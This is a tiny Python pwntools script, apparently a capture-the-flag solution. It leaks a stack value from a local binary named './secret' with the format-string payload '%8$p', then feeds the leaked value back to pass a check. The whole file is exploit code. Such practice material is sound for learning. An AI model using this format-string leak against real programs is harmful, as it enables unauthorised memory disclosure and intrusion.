from pwn import *

p = process("./secret")

p.sendlineafter(b"!\n", b"%8$p")
secret = p.recvline()

p.sendlineafter(b": ", secret)
p.interactive()